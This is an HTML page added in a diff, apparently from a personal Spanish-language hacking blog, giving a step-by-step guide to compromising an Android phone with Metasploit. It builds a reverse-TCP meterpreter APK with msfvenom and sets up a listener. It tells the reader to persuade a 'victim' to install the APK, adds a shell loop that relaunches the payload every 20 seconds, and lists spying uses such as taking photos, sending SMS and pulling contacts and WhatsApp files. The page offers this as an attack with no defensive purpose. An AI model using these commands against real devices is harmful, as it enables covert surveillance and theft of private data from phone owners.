@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"
+        <title="hackear android con metasploit">
+        <link href="./css/temas.css" rel="stylesheet">
+    </head>
+    <body background="./img/negro.jpg">
+
+      <div id="header">
+        <img src="./img/logo.png"/ class="logo">
+        <ul>
+          <li><a href="index.html">Inicio</a></li>
+          <li><a href="temas.html">Temas</a></li>
+          <ul>
+            <li><a href="hack_instagram.html">Hackear Instagram</a></li>
+            <li><a href="meterpreter_android.html">Hackear android</a></li>
+          </ul>
+          <li><a href="sobre-mi.html">Sobre mi</a></li>
+          <li><a href="contact.html">Contáctame</a></li>
+        </ul>
+      </div>
+
+      <div id="content">
+        <img src="./img/msflogo.jpg" class="msf1">
+        <h1>Hackear android con metasploit</h1>
+        <p>Para hackear un android con metasploit lo primero que necesitamos es tener Kali linux, Parrot os u otra distro de linux destinada a la seguridad que venga con metasploit
+          instalado. Lo primero que haremos sera crear la apk que nos servirá para entrar en el dispositivo android de la víctima.</p>
+        <p>root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=[Tu_IP] LPORT:4444 -o msf.apk</p>
+        <p>Pondremos nuestro pc a escuchar para poder conectar con el dispositivo.</p>
+        <p>root@kali:~# msfconsole</p><br />
+        <img class="meterpreter" src="./img/meterpreter1.png">
+        <p>msf6 > use multi/handler<br />
+          msf6 > set payload android/meterpreter/reverse_tcp<br />
+          msf6 > set lhost 192.168.0.4 (la ip que hemos configurado antes en la creación de la apk)<br />
+          msf6 > set lport 4444<br />
+          msf6 >exploit<br />
+        </p>
+        <img class="meterpreter" src="./img/meterpreter2.png">
+        <p>Una vez hayamos puesto nuestro pc a escuchar, lo que haremos será convencer a la víctima para instalar la apk que creamos antes. Cuando estemos dentro con el comando
+          help podremos ver todas las opciones posibles. Lo que haremos será abrir una terminal y hacer persistente el meterpreter.<br />
+          > shell <br />
+          > cd /<br />
+          > cd /sdcard/Download<br />
+          > touch persistence.sh<br />
+          > nano persistence.sh<br /></p>
+        <img class="meterpreter" src="./img/meterpreter3.png">
+        <p>Ahora añadiremos dentro de persistence.sh lo siguiente:<br />
+          #!/bin/bash<br />
+          while :<br />
+          do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity<br />
+          sleep 20<br />
+          done<br /></p>
+        <p>Volvemos a la meterpreter y una vez estamos en la ruta /sdcard/Download usamos el siguiente comando.<br />
+
+          > upload /root/Desktop/persistence.sh<br />
+        </p>
+        <p>Luego abrimos una shell usando.<br />
+
+          > shell</p>
+
+        <p>Vamos a la ruta de nuestro .sh y lo ejecutamos.<br />
+
+          > cd /<br />
+          > cd /sdcard/Download<br />
+          > sh persistence.sh<br />
+        </p>
+
+        <p>Desde la meterpreter de metasploit si escribimos el comando show podemos ver varios comandos que hacen diferentes funciones, como hacer fotos desde su camara,
+            instalar aplicaciones, mandar sms, descargar los contactos de la víctima y muchas otras funciones.<br />
+        </p>
+        <img class="meterpreter" src="./img/meterpreter4.png">
+
+        <p>Desde la shell si vamos a /sdcard podemos ver cosas como las aplicaciones instaladas en el dispositivo y los archivos de estas como podrian ser conversaciones o archivos de whatsapp.<br />
+        </p>
+        <img class="meterpreter" src="./img/meterpreter5.png">
+      </div>
+    </body>
+    <footer>
+      <p>Author: Eder López<br>
+      <p>Sígueme en <a href=https://www.instagram.com/edertxu2407/>Instagram</a></p>
+    </footer>
+</html>
